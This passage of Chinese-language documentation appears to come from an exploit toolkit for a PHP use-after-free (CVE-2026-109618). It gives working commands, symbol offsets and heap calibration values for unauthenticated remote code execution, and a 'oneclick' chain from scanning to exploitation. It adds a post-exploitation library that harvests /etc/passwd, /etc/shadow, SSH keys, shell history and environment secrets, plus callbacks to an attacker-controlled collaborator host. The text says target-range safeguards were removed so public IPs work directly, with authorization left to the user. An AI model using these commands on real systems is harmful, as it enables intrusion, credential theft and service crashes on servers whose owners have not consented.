`PREMISES_ONLY_UNVERIFIED`（退出码 15），**不再对外宣称可 RCE**。

### 15.2 参数

| 参数 | 默认 | 说明 |
|---|---|---|
| `--active-rounds N` | `2` | 主动 UAF 实测轮数；每轮都是「同连接 A→B」 |
| `--no-active-uaf` | 关 | 跳过主动实测（只做前置判定，结果必为 `PREMISES_ONLY_UNVERIFIED`） |

`scan` / `batch` / `auto` 都支持这两个参数。批量场景下建议保持 `--active-rounds 2`：
既能把已修复版本压到 15，又不至于对目标造成过多 worker 崩溃。

### 15.3 四靶场对照（本机实测，2026-10-23）

| 目标 | 版本/配置 | 旧判据 | 新判定（active-rounds 2~3） |
|---|---|---|---|
| `127.0.0.1:8088` | PHP 8.2.12，`post_max>memory_limit` | LIKELY_RCE | **LIKELY_RCE**（active: 崩溃 3/3） |
| `127.0.0.1:8089` | PHP 8.2.35（已修复） | ~~LIKELY_RCE~~（误报） | **PREMISES_ONLY_UNVERIFIED**（不崩） |
| `127.0.0.1:8090` | PHP 8.4.26-apache | LIKELY_RCE | **RCE_READY**（exploit 后回读 proof） |
| `127.0.0.1:8091` | 8.4.26，128M/8M 生产默认 | AFFECTED_DOS_ONLY | **AFFECTED_DOS_ONLY** |

### 15.4 proof 校验：从「假阴性」到可回读

`exploit` / `auto` 之前依赖「proof 文件在本地可见」来判定成功，而 `-c 'id>/out/x'` 写的是
**目标容器内**的 `/out/x`，攻击侧默认看不到 → 命令明明执行了，stdout 却报「利用未成功」。
v1.4 的处理：用 `--proof-dir` 把**目标侧目录映射到本地可读目录**，判定顺序为

1. 命令投递 + worker 崩溃（原语生效的强证据）
2. `--proof-dir DIR`：读 `DIR/<basename>`，内容匹配 `uid=` 才算 `RCE_READY`
3. 读不到 → 打印「已执行但 proof 无法带内回读」，给出 `--proof-dir` 用法提示，**不谎报失败**

```bash
# 容器 /out 已挂载到宿主 lab/out 时的正确用法
python3 php2shell.py auto -u http://127.0.0.1:8090/ -c 'id>/out/a5' \
    --proof-dir /path/to/lab/out
# → proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 15.5 命令长度与落点

`MAX_CMD = 14` 字节，`id>/out/a5` = 10 字节安全。写 webroot 的相对路径（`id>o`）不可靠：
Apache 进程 cwd 未必是 DocumentRoot，且 webroot 是否 1777 取决于镜像 —— 不要用它做自动化 proof，
统一用 `--proof-dir` 映射绝对路径。


---

## 16. 跨版本攻击能力：符号推导 + 标定 + 后渗透命令库（`attack/p2s_ext.py` v2）

> 目标：让工具不再「只认某一个 PHP 构建」。换版本时不再靠猜，而是分成**确定性推导**与**可测量标定**两段。

### 16.1 为什么换版本会失败（三类原因，必须分开处理）

| 失效原因 | 性质 | 处理方式 |
|---|---|---|
| `zif_system` / `zval_ptr_dtor` 偏移变化 | **确定性**（构建产物属性） | 读目标 `libphp.so` 符号表，不猜版本 |
| `ht_size`（167B 槽位大小）/ `htdata_offset`（槽位落在 Zend MM chunk 的哪个位置） | **可测量**（分配器/堆历史相关） | 用「命令执行 + HTTP 回读」做 oracle 标定 |
| 工具自身 stdout 判定 | 工程缺陷 | 一律以 HTTP 回读 / `--proof-dir` 为准（已修） |

### 16.2 `symbols`：从二进制确定偏移（不猜版本、不看发行版）

```bash
# 本地 .so
python3 attack/p2s_ext.py symbols --elf labsym/libphp.so --out profiles/t.json
# 直接对容器抽取（自动 docker cp 到当前目录）
python3 attack/p2s_ext.py symbols --docker php2shell-8426 --out profiles/t.json
```

实测（同一台机器上两个构建，偏移完全不同 —— 说明「按版本号查表」不可靠）：

```
PHP 8.2.12 (bookworm)  zif_system=0x398ec0  zval_ptr_dtor=0x4807d0
PHP 8.4.26 (trixie)    zif_system=0x465370  zval_ptr_dtor=0x65eb60
```

若二进制被 strip（找不到符号）→ 退出码 4，提示退回 `calibrate` 盲搜。

### 16.3 `calibrate`：只标定真正未知的分配器参数

```bash
# 单点验证（已知 profile 直接打）
python3 attack/p2s_ext.py calibrate -u http://127.0.0.1:8090/ \
    --profile profiles/p8426.json --rounds 8 --tries 2
# 小窗网格（ht_size × htdata_offset）
python3 attack/p2s_ext.py calibrate -u http://127.0.0.1:8090/ \
    --ht-size-lo 159 --ht-size-hi 175 --htdata-window 0x680000:0x6A0000 --htdata-step 0x100
```

oracle 只有一条：**命令执行后 HTTP 回读标记文件，200 且不是 404 页面**（两次都成立才算命中）。命中即写 `profiles/<host>_<port>_<ht_size>.json`，退出码 0；全败退出 15 并打印每一组的失败阶段（stage1/stage2/stage3），可直接判断是前置、泄漏还是布局问题。

**泄漏正确性的交叉验证（强烈建议做一次）**：把容器内 `cat /proc/1/maps` 与 Stage-1/2 的泄漏值比对。
本机实测 `libphp_base=0x7ffff680e000` 与 `/proc/1/maps` 中
`7ffff680e000-7ffff6964000 r--p ... /usr/lib/apache2/modules/libphp.so` **完全一致** →
证明 Stage-2 泄漏与 `zif = libphp_base + zif_offset` 计算无误，问题只会出在 `htdata`。

### 16.4 成功率与重试（实测数据，务必据此设置参数）

- 单轮（一次 污染→解引用）成功率实测约 **1/6 ≈ 17%**，单轮耗时约 **2.5s**（8090，样本 n=6）。
- 因此：`--rounds 8` 单次约 67%，配合 `--tries 3` 约 **96%**；`--rounds 20` 约 97%。
- 曾因 `--rounds 1~2` 而误判「构建漂移导致失效」——**低轮次全 miss 不能作为失效证据**。
- 一次成功实证（8090，`--rounds 6`）：
  `id>zr6` → `GET /zr6` = 200，`uid=33(www-data) gid=33(www-data) groups=33(www-data)`（54B，owner=www-data）。

### 16.5 假阴性修复（`php2shell.py` exploit 收尾）

引擎在成功时也可能出现 `解引用B=0B`（对端 reset），旧逻辑据此打印「失败」并 exit 30 —— 但命令**已经执行**。
现已在 `run_exploit()` 收尾增加回读校验：命令含 `>name` 重定向时，自动 `GET /name`，200 且非 404 即判成功并打印
`回读 name 成功（NB）`，退出码 0。实测 `--rounds 8` 三次连续均 exit 0。

### 16.6 `postex`：RCE 之后的攻击动作库（19 条，全部 ≤14 字节）

命令长度硬上限 14B（`ht_size 167 − 0x98 − 1`），因此库内全部采用短名重定向与 glob 压缩：

| key | 命令 | 目的 |
|---|---|---|
| id | `id>i` | 进程身份 |
| whoami | `whoami>w` | 用户 |
| uname | `uname -a>u` | 内核/发行版（提权前置） |
| hostname | `hostname>hn` | 主机/容器 id |
| env | `env>e` | 环境变量：DB、云 AK/SK、代理、token |
| passwd | `cat /etc/p*>p` | 账号清单 |
| hosts | `cat /etc/ho*>hs` | 内网拓扑 |
| shadow | `cat /etc/sh*>sh` | 口令哈希（需 root） |
| ps | `ps>ps` | 进程表 |
| ip | `ip a>ip` | 网卡/网段 |
| ss | `ss -an>ss` | 监听端口 |
| lsroot | `ls -l />lr` | 根目录权限 |
| lsetc | `ls /etc>le` | /etc 清单 |
| lsrec | `ls -R /var>lv` | 应用配置递归 |
| bashhist | `cat ~/.b*>hb` | 历史命令（常见明文口令） |
| sshkey | `cat ~/.ssh/*>sk` | SSH 私钥 |
| crontab | `crontab -l>ct` | 计划任务 |
| dockersock | `ls /var/run>vr` | 是否挂 docker.sock |
| logs | `cat /var/*/*>lg` | 日志片段（可见性判断） |

用法：

```bash
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8090/ --rounds 8 --tries 3
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8090/ --only id,env,passwd
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8090/ --cleanup   # 清掉标记文件
```

产出：`postex_out/<key>`（原始字节）、`postex_out/report.json`（逐条状态/字节/凭据线索），并在命中凭据类正则时标注 `⚠凭据线索`。

**实测（8090，PHP 8.4.26，www-data）**：
```
id        OK  54B    uid=33(www-data) gid=33(www-data) groups=33(www-data)
passwd    OK  2219B  root:x:0:0:root:/root:/bin/bash
lsrec     OK  ~20KB  /var 递归清单
lsroot    OK  1046B  根目录权限
uname     OK  121B
dockersock OK 13B
```

### 16.7 跨版本负结果（同样重要）

- **PHP 8.2.12（8088）**：符号可精确取得（zif=0x398ec0/dtor=0x4807d0，前置 64M/8M 与 upload_progress 均满足），但
  `--stage1-n 12/25/40` 全部 **Stage-1 泄漏失败** → 该构建下本技术**缺少 infoleak 原语**，只能造成 worker 崩溃（DoS），
  无法完成 RCE 链。工具对此的处置是：`calibrate` 会在每组后打印失败阶段，stage1 连续失败即应判定「泄漏不可用」而非继续盲扫。
- **PHP 8.4.26 + 128M/8M（8091）**：`post_max_size < memory_limit` 使 OOM 落在 rfc1867 之后的悬垂前提消失 → 仅 DoS。

### 16.8 护栏

范围校验已移除：`symbols/calibrate/postex` 不再检查目标网段，公网 IP 可直接使用。
后渗透库**不含**持久化、横向、日志清除类动作（14B 也物理上做不到）。


### 16.9 命令容量 = f(ht_size)：14B 不是天花板

`php2shell.py` 与 `p2s_ext.py` 都按 `cap = ht_size - 0x98 - 1` 计算单条命令容量，`--ht-size` 改变的不只是"堆槽位"，直接决定后渗透命令能写多长：

| ht_size | cap | 能塞进去的代表命令 |
|---|---|---|
| 167（默认/已验证） | 14B | `id>i`、`cat /etc/p*>p`(13B)、`id>/out/i`(10B) |
| 191 | 38B | `cat /etc/passwd>/o/pw`(21B)、`ls -R /var>/o/lv`(17B)、`crontab -l>/o/ct`(16B)、`cat ~/.ssh/*>/o/sk`(19B) |
| 223 | 70B | `find / -perm -4000 -type f>/o/su`、`cat /etc/passwd /etc/shadow>/o/pw` |

**代价（必须知道）**：`ht_size` 同时也是伪造 HashTable 的槽位尺寸，**改它就必须重标定 `htdata_offset`**（不同 size class → 不同 Zend MM bin → 15 个载体串落点整体平移）。本靶场实测 `ht_size=167` 对应 `htdata_offset=0x690D8`；其它 ht_size 需重新 `calibrate`。工具已把容量计算与 `--dir/--local-dir` 通道打通，标定命中后即可直接用长命令。

### 16.10 回读通道：相对路径**不可靠**，绝对目录通道才是正解

本靶场（容器 `p2s_clean`，镜像 `php2shell-lab:8426`）实测两种通道的差异：

| 通道 | 命令 | 结果 |
|---|---|---|
| 相对（期望落 docroot） | `id>w1` / `id>c1` / `id>c2` / `id>c3` / `id>q82` + `--rounds 8~24` | **全部失败**：`docker exec ls /var/www/html` 仅 `index.php`，HTTP `GET /w1` = 404 |
| 绝对（bind mount） | `id>/out/w2`、`id>/out/k1`…`k6`、`env>/out/e`、`pwd>/out/c`、`ip a>/out/ip`、`ps>/out/ps`、`ss -an>/out/ss` | **全部成功**：宿主 `lab/out/` 内 54B~1071B，`owner=www-data`，内容 `uid=33(www-data) gid=33(www-data) groups=33(www-data)`、`pwd=/var/www/html`、env 1071B |

结论：利用在 **shutdown/longjmp 路径**上执行命令，此时进程 cwd 并不保证等于脚本目录（即便 `pwd` 探针回显 `/var/www/html`），所以**相对重定向会静默落空**。工程上必须：

```bash
# 先探针确认执行 + 通道（绝对目录）
python3 attack/php2shell.py exploit -u http://127.0.0.1:8092/ -c "pwd>/out/c" \
  --htdata-offset 0x690D8 --ht-size 167 --rounds 8
# 再用绝对通道跑命令库（--local-dir 必须与容器内 --dir 指向同一物理目录）
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8092/ \
  --dir /out --local-dir ../../lab/out --rounds 6 --tries 2
```

**命中率实测（绝对通道、rounds=8）**：连续 6 次 `--rounds 8` 全部命中（`k1`~`k6`，6/6）。此前记录的"冷却期 0/6、rounds=24 全 miss"是**我方判据 bug**：`--local-dir` 写成了 `../lab/out`（相对 toolkit 目录指向不存在的 `deliver/lab/out`），命令其实已经执行并写盘，只是 oracle 一直在错的目录里找文件。教训：**回读目录必须与容器内写入目录是同一物理路径，且判据要能区分"文件不存在"与"路径写错"**（工具现已支持 `--dir/--local-dir`，并在每次尝试前清理同名残留文件，避免陈旧文件造成假命中）。


#### 16.10.1 `--proof-dir` 必配（否则绝对通道会被判 fail）

绝对目录通道写出的文件不在 webroot，工具末尾的"HTTP 回读"自然取不到，会给出 `exit 30 (SAFE)` 的**假阴性**。实测：

```bash
# 不给 --proof-dir：proof 文件已生成，但退出码 30
python3 attack/php2shell.py exploit -u http://127.0.0.1:8092/ -c "id>/out/ctl" ... --rounds 8     # rc=30
# 给上 --proof-dir：同一命令 rc=0 且打印 RCE 成功
python3 attack/php2shell.py exploit -u http://127.0.0.1:8092/ -c "id>/out/pd1" ... --rounds 8 \
  --proof-dir ../../lab/out                                                                        # rc=0
--- proof ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 16.10.2 `ht_size` 不是自由旋钮（负结果，重要）

为放宽 14B 上限，实测扫过 `ht_size=191`、`htdata_offset ∈ [0x50000, 0x7A000] step 0x800`（85 个候选，每个 `--rounds 3`，绝对通道 + 陈旧文件清理）→ **0/85 全 miss**；
同一分钟内用 `ht_size=167 / htdata=0x690D8 / --rounds 8` 做对照 → **一次命中**（`/out/ctl` 54B，`uid=33`）。

结论：本构建（8.4.26 / Debian trixie / Apache 2.4.69）上 `ht_size=167` 是**唯一可用槽位尺寸**，它与伪造 HashTable 的布局强耦合；
换成 191 后 15 个载体串落入不同 size class，即使平移 `htdata_offset` 也拼不出可用的 `pData`/`pDestructor` 结构。
因此 **14B 命令上限是该构建的实际天花板**，长命令（`cat /etc/passwd>/o/pw` 21B 等）在本构建上不可达 —— 这是物理约束，不是实现缺陷。
若在别的构建上标定出 191/223 可用，`p2s_ext.py` 的容量计算（`cap = ht_size - 0x98 - 1`）与 `--dir/--local-dir` 通道会自动适配，无需改代码。

### 16.11 攻击代码加入工具后的能力边界（诚实结论）

- 能做的：任意 **≤cap** 命令执行（cap 随 `ht_size`；**本构建实测仅 167 可用 → 实际 cap=14B**）；`/etc/passwd` 级任意文件读取；环境变量/进程/网络/监听/目录清单；结果经绝对目录通道落到可回读位置。
- 做不到（物理限制，不是实现缺失）：无法在 14B 预算内写 WebShell/反弹 Shell/cron 持久化/清日志；这些需要 `ht_size≥223` 且标定成功，且**本项目明确不做驻留、横向与清痕**，故不实现。
- 因此工具定位：**漏洞验证 + 最小后渗透取证**，不做持久化与横向。

## 17. 真实公网使用指南（仅限书面授权目标）

> 本节面向「把工具用到真实网站/公网 IP」的场景。**前置铁律：先拿到书面授权（范围 + 时间窗 + 联系人 + 数据处理方式），否则不要发任何 OOM 探测包**。本工具的所有 OOM 原语都会直接打死 worker，属于可感知、可致服务退化的测试行为。

### 17.1 实验室参数为什么不能直接搬到公网

| 差异项 | 实验室（本仓库 8090/8092） | 真实公网目标 | 后果与对策 |
|---|---|---|---|
| ASLR | 宿主 `randomize_va_space=0`，地址恒定 | 默认开启 | 泄漏值每次不同；Stage-1/2 必须在**同一 keep-alive 连接**内完成，并做两次一致性校验 |
| `ht_size` | 167（本构建实测唯一可用） | 未知，取决于 Zend MM 请求分配序列 | 用 `calibrate` 标定；无回读通道时用 `--collab`（见 17.4） |
| `htdata_offset` | `0x690D8` | 未知 | 同上；窗口扫描 + 回调 oracle |
| `zif/dtor` 偏移 | `0x465370` / `0x65EB60`（8.4.26 trixie） | 随版本/构建/编译选项变化 | 必须 `p2s_ext.py symbols --docker <容器>:/path/libphp.so` 或 `--elf` 重新取；**不可硬套** |
| 回读通道 | 有 `/out` 绑定挂载（1777） | 通常无；webroot 只读或不可预测 | 放弃 `--proof-dir`，改用 `blind`（带外回调）取证 |
| MPM/运行时 | Apache prefork + mod_php | nginx+fpm / apache event / 容器 alpine 等 | event/线程模型下悬垂窗口不同，命中率下降；fpm 需另行评估（本工具未覆盖） |
| WAF/CDN | 无 | 常见 | 大量 part、超长 header 会被拦；先用 `fingerprint` 只读探测，再小步加量 |
| 影响半径 | 本地容器，随打随重建 | 生产流量 | 必须约定时间窗、速率上限与「打挂后如何停手」 |

**结论**：真实目标上，「参数」几乎必然要重标一遍；工具的价值在于把这一步做成可重复流程，而不是把 167/0x690D8 直接打过去。

### 17.2 带外（OOB）盲验证：无回读通道时唯一的硬证据

真实站点往往没有可写目录，`--proof-dir` 那条路走不通。工具提供两条盲验证通道：

1. **OOB 回调（推荐，已实测）**：让目标自己发起一条短 HTTP 请求到你的协作端。
   ```bash
   # 目标需能解析 collab 主机名（可用 /etc/hosts 或公网 DNS）
   python3 attack/p2s_ext.py blind -u https://target/ --collab cb.example.com:9000 --token p1 --rounds 8
   ```
   命中时输出形如：
   ```
   [+] 收到回调：path=/p1 ip=203.0.113.10 ua=curl/8.14.1
   ```
   取证价值：`path` 里的 token 证明是我们注入的命令所产生，`ip` 证明出站来源就是目标主机，`ua` 可反推目标侧 curl 版本。实验室实测命中率约 20–50%/轮（`--rounds 8` 稳定命中）。
2. **时间侧信道**：`blind` 在无法出站时退化为 `sleep`-类判据；噪声大，仅作旁证。
3. **目标侧日志核对**：把回调请求与目标 access log 对齐，用于甲方复核（不伪造、不删改）。

**注意**：回调端口必须在授权范围内，且不得使用匿名代理池/被测方不知情的第三方中转。

### 17.3 授权清单（缺一项就不打）

- [ ] 书面授权：目标清单（域名/IP/端口/路径）、测试类型（含 DoS 容忍度）、时间窗
- [ ] 技术联系人 + 升级路径（打挂后多久停手、谁来重启）
- [ ] 速率上限（建议 ≤1 req/s，OOM 类请求单独限流）
- [ ] 数据处理：抓到的内存/环境信息如何脱敏、留存多久、谁可访问
- [ ] 停止条件：一旦出现 5xx 激增、延迟劣化或监控告警，立即停发

工具侧：地址范围校验已移除，公网目标可直接跑；授权责任完全由使用者承担。

### 17.4 推荐操作顺序（真实目标）

```bash
T=https://target.example.com/

# 1) 只读指纹（GET /、/index.php、/phpinfo.php…），判 PHP 版本是否落在受影响区间
python3 attack/p2s_ext.py fingerprint -u $T

# 2) 前置判定：post_max_size > memory_limit 才有悬垂窗口（工具内建判断）
python3 attack/php2shell.py auto -u $T            # 输出 AFFECTED / LIKELY / DOS-ONLY 等

# 3) 取符号（拿到与目标同构建的 libphp.so；容器镜像内路径一般 /usr/lib/apache2/modules/libphp.so）
python3 attack/p2s_ext.py symbols --docker <container>:/usr/lib/apache2/modules/libphp.so
python3 attack/p2s_ext.py symbols --elf ./libphp.so --out profile.json

# 4) 标定分配器参数：有回读通道用目录 oracle；无通道用回调 oracle
python3 attack/p2s_ext.py calibrate -u $T --profile profile.json --collab cb.example.com:9000 --rounds 8

# 5) 盲验证 RCE（不要先写 webshell，先证明能执行一条命令）
python3 attack/p2s_ext.py blind -u $T --collab cb.example.com:9000 --token p1 --rounds 8

# 6) 最小后渗透取证（只在授权范围内，命令长度受 cap 限制）
python3 attack/p2s_ext.py postex -u $T --profile profile.json --dir /out --local-dir ./out
```

### 17.5 命令容量与协作端长度的硬约束

`cap = ht_size − 0x98 − 1`（本构建 167 → **14B**）。这会直接约束回调写法：

| 写法 | 长度 | 是否可行（cap=14） |
|---|---|---|
| `curl h:9000` | 11B | ✅（实验室实测命中） |
| `curl h:9000/` | 12B | ✅ |
| `curl h:9000/p1` | 14B | ✅（临界，实测命中） |
| `curl cb.example.com:9000/p1` | 28B | ❌ → 必须先给目标一个**短主机名**（如 `/etc/hosts` 或短域名 `cb.x/A`） |
| `curl https://cb.example.com/p1` | 30B | ❌ |

因此真实目标上要么(1)用 HTTPS 但极短域名 + 短路径（`curl a.co/p`=12B 可行），要么(2)用 `getent hosts <短名>`(13B) 走 DNS 带外（需自有权威 DNS 记录）。**cap 更大的构建（ht_size 223 → 70B）则宽裕得多**，可用 `curl https://cb.example.com/xxx` 完整 URL。

### 17.6 能力边界（诚实结论）

- 能做：版本/前置判定、未认证 RCE（在受影响构建且 `post_max_size > memory_limit` 时）、OOB 盲证明、短命令后渗透（读文件/列目录/环境变量/进程/网络状态）。
- 不能做：写 webshell、反弹 shell、持久化、日志清除、长命令（受 cap 限制）、跨 MPM（fpm/event 未覆盖）、绕过 WAF 的通用手段。
- 命中率非 100%：需 `--rounds ≥ 8`，且同一进程内多轮比「每轮新建连接」高得多（工具已按此实现）。

---

> 只想「一条命令跑完」？见 §18 `oneclick`：指纹→前置→标定→利用/盲验证→后渗透→报告，全自动。

## 18. 一条命令全自动：`oneclick`（检测 → 利用 → 后渗透）

目标：**不做任何手工参数搬运**。给出 URL + 一条取证通道（带外回调或可写目录），
工具自动完成：只读指纹 → 前置判定 → profile 选择（含 cap 计算）→ 标定（可选）
→ 利用 / 盲验证 → 后渗透（可选）→ 结构化报告。

### 18.1 最小用法

```bash
# A) 有带外回调通道（公网首选，目标无需可写目录）
python3 attack/p2s_ext.py oneclick -u https://target/ \
    --collab cb.example.com:9000 --token p1 --listen --rounds 8 \
    --outdir out_target

# B) 目标有可写目录 + 本机可回读（靶场/内网）
python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ \
    --dir /out --local-dir ../../lab/out --rounds 8 --outdir /tmp/oc8090

# C) 全自动加强版：先回调标定 htdata_offset，再盲打，最后后渗透取证
python3 attack/p2s_ext.py oneclick -u https://target/ \
    --collab cb.example.com:9000 --token p1 --listen --calibrate \
    --postex --only id,env,ps --rounds 8 \
    --outdir out_target
```

只读预检（完全无攻击性，任何目标都可先跑）：

```bash
python3 attack/p2s_ext.py fingerprint -u https://target/     # 只 GET 5 个常见路径
```

### 18.2 内部流程（5 步）

| 步 | 动作 | 失败/早退行为 |
|---|---|---|
| 1 | `php2shell.py scan --json`：指纹、`session_start()` 消费点、`post_max_size` vs `memory_limit`、header 炸弹上界 | SAFE/PATCHED→30；UNREACHABLE→50；NO_SINK→40；版本高于修复阈值→30（**不做任何 OOM 探测**）；仅 DoS→20；仅前置→15 |
| 2 | profile 选择：`--profile` > 内置 `PROFILE_DB`（按 PHP 版本）> CLI 覆盖；同时算 `cap = ht_size − 0x98 − 1` | 该构建已知无 infoleak 原语（`rce_ok=False`）→ 20，不浪费流量 |
| 3 | 通道判定：有 `--collab` → 盲验证；有 `--dir`+`--local-dir` → 写回验证；都没有 → 10 并给出提示 | `--calibrate` 时先跑回调 oracle 标定 `htdata_offset` |
| 4 | 攻击：`exploit`（自动 `--proof-dir` 校验）或 `blind`（自动起监听、按 cap 过滤候选命令） | 取证命令自动按 cap 收敛（默认 `id><dir>/oNNN`，超长自动回退 `id><dir>/o`） |
| 5 | `--postex` 时自动后渗透取证（cap 感知命令库，`--only` 可选子集） | 报告落 `--outdir` |

产物：`<outdir>/scan.json`、`exploit.log` 或 `blind.log`、`profile_cal.json`（标定时）、
`postex/`（`--postex` 时）、`oneclick_report.json`（含 verdict / rce / exit / 各步 rc）。

### 18.3 退出码

| exit | 含义 |
|---|---|
| 0 | **RCE_READY**：拿到执行证据（proof 文件内容 或 OOB 回调命中） |
| 10 | LIKELY：前置满足但缺取证通道（补 `--collab` 或 `--dir/--local-dir`）或本轮未命中 |
| 15 | PREMISES_ONLY：只证明前置条件，未做利用 |
| 20 | AFFECTED_DOS_ONLY：可 OOM，但该构建无 infoleak → 仅 DoS |
| 30 | SAFE / PATCHED：版本已修复或无消费点 |
| 40 | NO_SINK：无 `session_start()` 消费点 |
| 50 | UNREACHABLE：目标不可达 |

### 18.4 `PROFILE_DB` 覆盖面与扩展

内置（均已本机实测）：

| 版本 | ht_size | htdata | zif | dtor | stage2_t | 结论 |
|---|---|---|---|---|---|---|
| 8.4.26（php:8.4.26-apache，Debian trixie） | 167 | 0x690D8 | 0x465370 | 0x65EB60 | 406 | **RCE 可用**，cap=14B |
| 8.2.12（NTS，prefork） | 167 | 0x690D8 | 0x398EC0 | 0x4807D0 | 406 | Stage-1 必失败 → 仅 DoS |

新构建扩展三步（缺一不可）：

```bash
# 1) 取符号偏移（只读，任意同名 libphp.so 均可）
python3 attack/p2s_ext.py symbols --elf /path/to/libphp.so
# 2) 回调 oracle 标定分配器参数（需要目标可达 + 回调可达）
python3 attack/p2s_ext.py calibrate -u https://target/ --collab cb:9000 \
    --ht-size 167 --htdata-window 0x68000:0x6A000 --rounds 8 \
    --out profiles/<ver>.json
# 3) 登记到外部 profile 库 profiles.json（见 18.5），此后 oneclick 免手工参数
```

### 18.5 外部 profile 库 `profiles.json`

内置 `PROFILE_DB` 只收录本机实测过的版本；其他构建无需改代码，写一个 JSON 即可扩展。

**搜索顺序（先命中先用，内置永远优先）**

1. `<包根>/profiles.json`
2. `~/.php2shell/profiles.json`
3. `./profiles.json`（当前工作目录）

同名版本（如 `8.4.26`）在外部文件里出现时**不会覆盖**内置条目，只对内置没有的版本生效。
加载器会做类型强转：hex 字符串（`"0x690D8"`）与十进制字符串都会被转成 int，缺字段或非法值直接跳过该条并告警，不影响其他条目。

**文件格式**（顶层以「PHP 版本」为键）

```json
{
  "8.4.27": {
    "ht_size": 167,
    "htdata_offset": 430296,
    "zif_offset": 4608880,
    "dtor_offset": 6679392,
    "stage2_t": 406,
    "rce_ok": true,
    "label": "8.4.27 (docker:php2shell-8427)"
  }
}
```

| 字段 | 含义 | 来源 |
|---|---|---|
| `ht_size` | 伪造 HashTable 的尺寸（决定 cap = ht_size − 0x98 − 1） | 标定 |
| `htdata_offset` | 目标进程里 HashTable 数据区相对 libphp 基址的偏移 | 标定 |
| `zif_offset` | `zif_system` 偏移（伪 pDestructor 落点） | `symbols` |
| `dtor_offset` | `zval_ptr_dtor` 偏移 | `symbols` |
| `stage2_t` | Stage-2 命中时用的 header 数（逐版本不同） | 标定 |
| `rce_ok` | 该构建实测能否打穿；`false` = 只能 DoS，oneclick 会降级退出 20 | 人工/实测 |
| `label` | 人类可读备注，仅展示用 | 任意 |

**生成方式（无需手写）**

```bash
# A. 从本机 docker 容器自动探测（推荐；本机无新镜像时只覆盖已有容器版本）
tools/build_profiles.sh                      # 自动扫描 php2shell* 容器并写入 profiles.json

# B. 指定容器/ELF + 版本
tools/build_profiles.sh --out profiles.json --from-docker 8.4.26=php2shell-8426
python3 tools/build_profiles.py --out profiles.json \
    --from-elf 8.4.27=/path/to/libphp.so --stage2-t 406 --rce-ok true

# C. 只看不写
python3 tools/build_profiles.py --from-docker 8.4.26=php2shell-8426 --dry-run
```

`symbols` 只能给出 `zif_offset` / `dtor_offset` / `ht_size` / `htdata_offset`；`stage2_t` 与 `rce_ok` 必须由 `calibrate`/`oneclick` 实测回填（`--stage2-t` / `--rce-ok`）。**未实测的版本不要写进库**，否则会把「AFFECTED 但打不穿」的构建误标成可 RCE。

**校验**

```bash
python3 - <<'EOF'
import json;d=json.load(open("profiles.json"));print(len(d),"profiles:",list(d))
EOF
python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ --rounds 4 --tries 2 --force \
    --outdir /tmp/prof_check | tail -3   # 日志里应能看到 profile=db:8.4.26 或 file:8.4.26
```

### 18.6 使用边界（务必遵守）

- 公网/非授权资产：代码不再拦截公网目标，但真实目标必须持有**书面授权**；
  先跑只读 `fingerprint`/`recon` 判定，再决定是否 `oneclick`。
- 该链的触发方式是**制造 OOM**：对生产站点意味着 worker 崩溃/资源抖动。
  授权范围应明确允许，且应先 `fingerprint` 只读判定，避免盲打。
- 命令容量由 `ht_size` 决定（本构建 14B）：不可写 webshell、不可反弹 shell、
  不可持久化；后渗透只做最小取证（`id`/`env`/`ps`/读系统文件）。
- 不做驻留、横向、清痕、匿名化；日志一定留痕（access/error log 双记录）。

## 19. 真实目标零挂载用法：`--http-read`（写 webroot + HTTP 回读）

前 18 节里 `exploit` 的验收依赖 `--proof-dir`（宿主挂载目录）。真实目标没有挂载，`--http-read` 提供等价通道。

**原理**：PHP 进程 `cwd` 通常就是 webroot（Apache/mod_php + `DocumentRoot`），
命令里用**相对路径**落盘（`id>p123`）即写到 `DocumentRoot/p123`，随后直接 `GET /p123` 回读。
无需目标可写出网、无需挂载、无需盲回调基础设施。

```bash
# 单条命令级（相对写 + 回读）
python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
    --rounds 8 --tries 2 --force --postex --only id,env,ps \
    --outdir out
```

要点（都来自实测）：

| 要点 | 说明 |
|---|---|
| webroot 可写 | `www-data` 对 `DocumentRoot` 无写权限时整链失败（rc 仍可能是 30/20，不代表安全） |
| `cwd == webroot` | 若应用 `chdir()` 过，相对写落点变化 → 改用绝对路径 + 出网回调（`--collab`） |
| 命令长度 ≥6B | 实测 `< 6B` 命令（如 `id>i`）命中率极低；工具已用 `_pad_cmd()` 自动把落盘名补长，`postex` 因此从 NO_EFFECT 变为可用 |
| 命令上限 | `cap = ht_size − 0x98 − 1`，8.4.26-trixie 为 **14B**；超长命令会被工具判定并降级，不能写 webshell / 反弹 shell / 持久化 |
| `--force` | `scan` 的 OOM 探针被判 `PREMISES_ONLY_UNVERIFIED`（目标已被打过 OOM、或探针被限流）时会早退 15；确知前置满足（`post_max_size > memory_limit` + 有 `session_start()`）可 `--force` 直接进入攻击 |
| `--tries` | `postex` 每条命令重试次数（默认 3）。单轮成功率实测约 1/6，配合 `--rounds 8` 才稳 |

三种回读通道的取舍：

1. `--collab cb.host:9000 --token p1 --listen` —— 最通用：目标**不需要可写目录**，只要能出网（`curl`/`fsockopen` 均可）。公网首选。
2. `--http-read BASE` —— 目标**不需要出网**，但需要 webroot 可写 + cwd 正确。内网/出网被 ACL 拦时首选。
3. `--dir /abs/path --local-dir ./mnt` —— 仅靶场/容器挂载场景（本仓库 lab 用法），真实目标不可用。

## 20. 通用 Web 扫描已彻底移除（本工具只做 CVE-2026-109618）

本工具**只针对 CVE-2026-109618**，已无任何通用 Web 漏洞扫描能力：

| 已移除 | 状态 |
|---|---|
| `extras/legacy-webscan/webscan.py` | 已从源码树**删除**（非移动），交付包与源码副本内均无此文件 |
| SQLi / XSS / CSRF / LFI / CMDi 检测 | 代码路径全部清除，`attack/` 下不存在任何注入类扫描逻辑 |
| GUI 通用扫描模式 | 前端只剩 `recon`（四前置分级）与 `oneclick`（109618 利用链） |
| `max_urls / max_params / forms / safe / fingerprint` 等参数 | 服务端 opts 白名单已删除，传了也不生效 |

> 判定依据：本 CVE 能否打穿只由四个前置决定（受影响版本 / `post_max_size > memory_limit` /
